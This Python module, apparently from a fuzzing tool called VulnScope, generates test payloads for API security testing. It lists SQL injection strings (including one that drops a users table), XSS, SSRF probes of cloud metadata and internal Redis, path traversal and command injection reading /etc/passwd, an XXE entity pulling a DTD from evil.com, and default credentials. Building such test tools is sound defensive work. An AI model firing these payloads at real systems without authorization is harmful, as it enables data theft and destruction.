"""
VulnScope - Payload Generator
Generate test payloads for API fuzzing
"""

from typing import List, Dict, Any, Optional
from pathlib import Path
import random


class PayloadGenerator:
    """
    Generate test payloads for API fuzzing
    
    Features:
    - Multiple payload categories
    - Custom wordlist support
    - Parameter-specific payloads
    - Encoding options
    """
    
    def __init__(self, wordlists_path: Optional[str] = None):
        self.wordlists_path = wordlists_path or "/opt/vulnscope/wordlists"
        self.custom_payloads: Dict[str, List[str]] = {}
    
    # SQL Injection payloads
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT username,password FROM users--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR ''='",
        "' OR 'x'='x",
        "1' WAITFOR DELAY '0:0:5'--",
        "'; DROP TABLE users--",
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=\"alert(1)\">",
        "<details open ontoggle=alert(1)>",
        "javascript:alert(1)",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=\"x:alert(1)\">",
    ]
    
    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://metadata.google.internal/",
        "http://169.254.169.254/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://aws.internal/latest/meta-data/",
        "file:///etc/passwd",
        "dict://localhost:11211/stats",
        "gopher://127.0.0.1:6379/_INFO",
        "gopher://127.0.0.1:6379/_CONFIG",
    ]
    
    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//....//etc/passwd",
        "..;/..;/..;/..;/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]
    
    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| ls -la",
        "`ls -la`",
        "$(ls -la)",
        "\nls -la",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "ping -c 1 localhost",
    ]
    
    # XXE payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
    ]
    
    # Default passwords/credentials
    DEFAULT_CREDENTIALS = [
        "admin:admin",
        "admin:password",
        "admin:123456",
        "root:root",
        "root:password",
        "root:toor",
        "test:test",
        "user:user",
        "guest:guest",
    ]
    
    # API keys/tokens
    API_KEYS = [
        "sk_live_51abcdefghijklmnop",
        "AKIAIOSFODNN7EXAMPLE",
        "ghp_xxxxxxxxxxxxxxxxxxxx",
        "xoxb-xxxxxxxxxxxx-xxxxxxxxxx",
    ]
    
    def get_payloads(self, category: str) -> List[str]:
        """
        Get payloads for a specific category
        
        Args:
            category: Payload category (sql, xss, ssrf, etc.)
            
        Returns:
            List of payloads
        """
        category = category.lower()
        
        if category in self.custom_payloads:
            return self.custom_payloads[category]
        
        payload_map = {
            'sql': self.SQL_PAYLOADS,
            'sql_injection': self.SQL_PAYLOADS,
            'sqli': self.SQL_PAYLOADS,
            'xss': self.XSS_PAYLOADS,
            'cross_site_scripting': self.XSS_PAYLOADS,
            'ssrf': self.SSRF_PAYLOADS,
            'server_side_request_forgery': self.SSRF_PAYLOADS,
            'path_traversal': self.PATH_TRAVERSAL_PAYLOADS,
            'lfi': self.PATH_TRAVERSAL_PAYLOADS,
            'command_injection': self.COMMAND_INJECTION_PAYLOADS,
            'cmdi': self.COMMAND_INJECTION_PAYLOADS,
            'xxe': self.XXE_PAYLOADS,
            'xml_external_entities': self.XXE_PAYLOADS,
            'credentials': self.DEFAULT_CREDENTIALS,
            'api_keys': self.API_KEYS,
        }
        
        return payload_map.get(category, [])
    
    def get_payloads_for_parameter(self, param_name: str, param_type: str = "string") -> List[str]:
        """
        Get payloads appropriate for a specific parameter
        
        Args:
            param_name: Parameter name
            param_type: Parameter type (string, integer, email, url, etc.)
            
        Returns:
            List of appropriate payloads
        """
        param_name = param_name.lower()
        
        # Map parameter names to payload categories
        name_category_map = {
            'id': 'sql',
            'user_id': 'sql',
            'post_id': 'sql',
            'category_id': 'sql',
            'email': 'sql',
            'username': 'sql',
            'password': 'credentials',
            'name': 'xss',
            'title': 'xss',
            'description': 'xss',
            'comment': 'xss',
            'content': 'xss',
            'url': 'ssrf',
            'link': 'ssrf',
            'redirect': 'ssrf',
            'next': 'ssrf',
            'data': 'ssrf',
            'reference': 'ssrf',
            'file': 'path_traversal',
            'path': 'path_traversal',
            'page': 'path_traversal',
            'template': 'path_traversal',
            'style': 'xss',
            'search': 'xss',
            'query': 'xss',
            'api_key': 'api_keys',
            'token': 'api_keys',
            'key': 'api_keys',
        }
        
        # Get category from parameter name
        category = name_category_map.get(param_name, 'xss')
        
        # Get payloads
        payloads = self.get_payloads(category)
        
        # Filter based on parameter type
        if param_type == 'integer':
            return ['1', '0', '-1', '999999', 'abc', '']
        elif param_type == 'email':
            return ['test@test.com', "test@test.com'--", 'admin@test.com']
        elif param_type == 'url':
            return ['http://google.com', 'http://localhost', 'javascript:alert(1)']
        
        return payloads
    
    def load_wordlist(self, wordlist_name: str) -> List[str]:
        """
        Load a custom wordlist
        
        Args:
            wordlist_name: Name of the wordlist file
            
        Returns:
            List of words from wordlist
        """
        wordlist_path = Path(self.wordlists_path) / wordlist_name
        
        if not wordlist_path.exists():
            return []
        
        try:
            with open(wordlist_path, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception:
            return []
    
    def add_custom_payloads(self, category: str, payloads: List[str]):
        """
        Add custom payloads for a category
        
        Args:
            category: Payload category
            payloads: List of payloads
        """
        if category not in self.custom_payloads:
            self.custom_payloads[category] = []
        self.custom_payloads[category].extend(payloads)
    
    def generate_fuzzing_payloads(self, base_value: str, count: int = 100) -> List[str]:
        """
        Generate fuzzing payloads by mutating a base value
        
        Args:
            base_value: Base value to mutate
            count: Number of payloads to generate
            
        Returns:
            List of fuzzed payloads
        """
        payloads = [base_value]
        
        # Add null bytes
        payloads.append(base_value + '\x00')
        
        # Add padding
        payloads.append('A' * 1000 + base_value)
        payloads.append('A' * 10000 + base_value)
        
        # Add special characters
        special_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', 
                        '-', '+', '=', '[', ']', '{', '}', '|', '\\', 
                        ':', ';', '"', "'", '<', '>', ',', '.', '/', '?']
        
        for char in special_chars[:10]:
            payloads.append(base_value + char)
            payloads.append(char + base_value)
        
        # Add encoding variations
        payloads.append(base_value.replace('a', '%61'))
        payloads.append(base_value.replace('a', '\\x61'))
        
        # Truncate
        if len(base_value) > 3:
            payloads.append(base_value[:len(base_value)//2])
            payloads.append(base_value[:2])
        
        # Add numbers
        for i in range(10):
            payloads.append(base_value + str(i))
            payloads.append(str(i) + base_value)
        
        # Random mutations
        random.seed(42)
        for _ in range(count - len(payloads)):
            mutation = list(base_value)
            if mutation:
                idx = random.randint(0, len(mutation) - 1)
                mutation[idx] = random.choice(special_chars)
                payloads.append(''.join(mutation))
        
        return payloads[:count]
    
    def get_all_categories(self) -> List[str]:
        """Get list of all payload categories"""
        return [
            'sql',
            'xss', 
            'ssrf',
            'path_traversal',
            'command_injection',
            'xxe',
            'credentials',
            'api_keys',
        ]
